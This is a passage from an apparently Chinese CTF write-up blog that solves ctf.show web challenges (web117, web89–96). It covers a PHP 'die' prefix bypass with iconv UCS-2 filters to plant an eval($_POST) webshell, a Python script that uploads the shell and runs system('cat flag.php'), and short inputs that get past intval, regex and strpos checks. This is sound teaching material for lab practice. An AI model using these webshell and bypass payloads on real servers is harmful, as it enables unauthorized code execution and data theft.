class="line">file_put_contents(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>); </span><br></pre></td></tr></table></figure><p>需要两个参数，GET和POST，file_put_contents()函数又是网文件中写数据，所以思路就是写shell，但是</p><p><code>&quot;&lt;?php die();?&gt;&quot;</code>又称死亡代码，需要绕过，常用的 rot13，base64，string编码绕过也被过滤了</p><blockquote><p>这里还有其他绕过编码的方式convert.iconv.UCS-2LE.UCS-2BE、convert.iconv.UCS-4LE.UCS-4BE</p><p>对于iconv字符编码转换进行绕过的手法，其实类似于上面所述的base64编码手段，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制exit;被反转而无法执行，而我们的恶意代码正常解码存储。，usc-2、usc-4等等，前者是2位一反转，所以shell要是2的倍数，例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[ab]);<span class="meta">?&gt;</span> ----&gt; ?&lt;hp pe@av(l_<span class="variable">$OPTSa</span>[]b;)&gt;?</span><br></pre></td></tr></table></figure><p>而后者是4位一反转，所以shell是4的倍数，例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[abcd]);<span class="meta">?&gt;</span> ----&gt; hp?&lt;e@ p(lavOP_<span class="variable">$a</span>[TS]dcb&gt;?;)</span><br></pre></td></tr></table></figure></blockquote><p>所以我们的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php</span></span><br><span class="line">或者</span><br><span class="line">?file=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php</span></span><br><span class="line">【postdata】为：?&lt;hp pe@av(l_<span class="variable">$OPTSa</span>[]b;)&gt;?</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web117-1.png"></p><p>上传webshell之后我们访问该文件进行操作</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web117.png"></p><p>读取flag(网站出了点问题)，只能用py脚本跑了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># Author: MTRleed</span></span><br><span class="line"><span class="comment"># file: web117.py</span></span><br><span class="line"><span class="comment"># time: 2023/8/2 11:15</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://6d901976-9095-46e1-ab22-38d48fd70aae.challenge.ctf.show/&quot;</span></span><br><span class="line">get_data = <span class="string">&quot;php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&quot;</span></span><br><span class="line">get_url = url + <span class="string">&quot;?file=&quot;</span> + get_data</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;contents&#x27;</span>: <span class="string">&#x27;?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=get_url, data=data)</span><br><span class="line">shell_url = url + <span class="string">&quot;shell.php&quot;</span></span><br><span class="line">test = requests.get(shell_url)</span><br><span class="line"><span class="keyword">if</span>(test.status_code == <span class="number">200</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]getshell成功&quot;</span>)</span><br><span class="line">    shell_data = &#123;</span><br><span class="line">        <span class="string">&#x27;ab&#x27;</span>: <span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = requests.post(url=shell_url, data=shell_data)</span><br><span class="line">    <span class="built_in">print</span>(result.text)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web117-2.png"></p><h2 id="php特性-89-150-plus"><a href="#php特性-89-150-plus" class="headerlink" title="php特性(89-150_plus)"></a>php特性(89-150_plus)</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 15:38:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p><strong>intval()</strong> 函数用于获取变量的整数值。</p><p><strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p></blockquote><p>首先第一个if判断有无参数num，第二个if正则匹配有没有数字，第三个if如果能为1的话，就可执行if里的语句，而intval函数用于object时会发生错误并返回1，所以payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web89.png"></p><p>​      </p><h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:06:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>intval()函数绕过，因为检测的是字符串，可以使用正负符号，小数点等等</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web91.png"></p><p>​      </p><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:16:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入的参数要进入正则，并且不能被检测出php。第一个if需要匹配到php，而第二个if如果匹配到php就会输出hacker，绕过需要不让它匹配到，这里有一个正则匹配的知识点</p><blockquote><p>/i表示匹配大小写<br> 字符 ^ 和 $ 同时使用时，表示精确匹配，需要匹配以php开头和以php结尾<br> /m 多行匹配 若存在换行\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配<br> 但是当出现换行符 <code>%0a</code>的时候，$cmd的值会被当做两行处理，而此时第二个if正则匹配不符合以php开头和以php结尾</p></blockquote><p>所以payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0aphp</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:29:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Note: </p><p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<br>◦ 如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>◦ 如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>◦ 将使用 10 进制 (decimal)。</p><p>所以我们可以使用不同的进制数来绕过；intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 </p><p>所以payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num=0x117C</span><br><span class="line">或者</span><br><span class="line">?num=4476e123</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:32:58</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>加入了对字母的过滤，我发现使用小数它只会输出小数点前面的数字，所以可以用小数点绕过；还可以使用不同进制，0b开头-&gt; 二进制，0开头 -&gt; 八进制， 0X开头 -&gt;16进制，所以还可以使用二进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num=4476.1</span><br><span class="line">或者</span><br><span class="line">?num=010574</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web93-1"><a href="#web93-1" class="headerlink" title="web93"></a>web93</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:46:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos(string,find,start)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要搜索的字符串。</td></tr><tr><td align="left"><em>find</em></td><td align="left">必需。规定要查找的字符串。</td></tr><tr><td align="left"><em>start</em></td><td align="left">可选。规定在何处开始搜索。</td></tr></tbody></table><p>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。</p><p><strong>注释</strong>：字符串位置从 0 开始，不是从 1 开始。</p></blockquote><p>加入一个新函数strpos()查找字符串首次出现的位置，返回的是数字，所以要求0在第二位，上把payload加空格刚合适</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num= 010574</span><br></pre></td></tr></table></figure><p>​       </p><h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:53:59</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>多过滤一个小数点，咱们继续使用上一把的payload，可以通过8进制绕过但是前面必须多加一个字节。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num= 010574</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 19:21:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span 